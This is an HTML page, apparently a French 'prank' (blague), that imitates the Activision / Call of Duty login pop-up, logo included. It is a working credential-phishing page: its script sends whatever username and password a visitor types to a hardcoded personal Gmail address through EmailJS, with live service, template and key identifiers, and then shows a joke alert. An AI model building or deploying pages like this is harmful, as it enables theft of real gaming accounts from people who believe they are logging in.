<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion Activision - Blague</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <!-- SDK EmailJS -->
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script type="text/javascript">
        (function(){
            emailjs.init("M-6tzdwk9Kf9X3aG4");
        })();
    </script>
    <style>
        /* Background image and styling */
        body {
            background-image: url('Screenshot from 2024-11-05 12-58-46.png'); /* Exemple d'image de guerre */
            background-size: cover;
            background-position: center;
            font-family: Arial, sans-serif;
        }
        
        /* Positionnement du bouton en haut à droite */
        .top-right-button {
            position: absolute;
            top: 20px;
            right: 20px;
        }

        /* Modal style */
        #prankForm {
            background-color: rgba(0, 0, 0, 0.8);
        }

        /* Custom styles for the form */
        .form-container {
            background: rgba(20, 20, 20, 0.9);
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
            color: white;
        }

        .input-field {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: 1px solid #444;
        }

        .input-field::placeholder {
            color: #aaa;
        }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <!-- Bouton de connexion en haut à droite -->
    <style>
        .top-right-button {
            position: absolute;
            top: 10px; /* Ajustez cette valeur pour déplacer le bouton plus haut */
            left: 1470px; /* Ajustez cette valeur pour déplacer le bouton plus à gauche */
        }
    </style>
    
    <button onclick="showPrankForm()" class="top-right-button px-6 py-3 text-white bg-gray-800 rounded-lg hover:bg-gray-700 focus:outline-none mr-12">
        Connexion Activision
    </button>

    <!-- Pop-up de style Call of Duty -->
    <div id="prankForm" style="display: none;" class="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-80">
        <div class="form-container max-w-sm w-full mx-4 p-6 rounded-lg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/26/Call_of_Duty_logo.svg" alt="Activision Logo" class="h-10 mx-auto mb-4">
            <h2 class="text-center text-2xl font-semibold text-white mb-4">Connexion Activision</h2>
            <p class="text-center text-sm text-gray-400 mb-6">Utilisez votre compte Activision</p>

            <!-- Formulaire de connexion -->
            <div class="mb-4">
                <label class="block text-sm font-medium text-gray-300">Nom d'utilisateur</label>
                <input type="text" id="friendId" placeholder="Nom d'utilisateur" class="input-field mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400">
            </div>

            <div class="mb-6">
                <label class="block text-sm font-medium text-gray-300">Mot de passe</label>
                <input type="password" id="prankCode" placeholder="********" class="input-field mt-1 block w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-yellow-400">
            </div>

            <button onclick="sendMessage()" class="w-full py-2 mb-4 bg-yellow-600 text-white rounded-lg hover:bg-yellow-700">
                Se connecter
            </button>
            <p class="text-center text-sm text-gray-500">Utilisez un ordinateur sécurisé pour vous connecter.</p>
        </div>
    </div>

    <script>
        function showPrankForm() {
            document.getElementById("prankForm").style.display = "flex";
        }

        function sendMessage() {
            const friendId = document.getElementById("friendId").value;
            const prankCode = document.getElementById("prankCode").value;

            if (friendId && prankCode) {
                emailjs.send("service_vus0eea", "template_915ogjt", {
                    friend_id: friendId,
                    prank_code: prankCode,
                    to_email: "bernardadrien26@gmail.com"
                })
                .then(response => {
                    console.log('E-mail envoyé !', response.status, response.text);
                    alert("Merci pour la blague ! Le résultat a été envoyé.");
                })
                .catch(err => console.error('Erreur lors de l\'envoi de l\'e-mail:', err));
            } else {
                alert("Veuillez entrer votre nom d'utilisateur et le mot de passe !");
            }
        }
    </script>
</body>
</html>
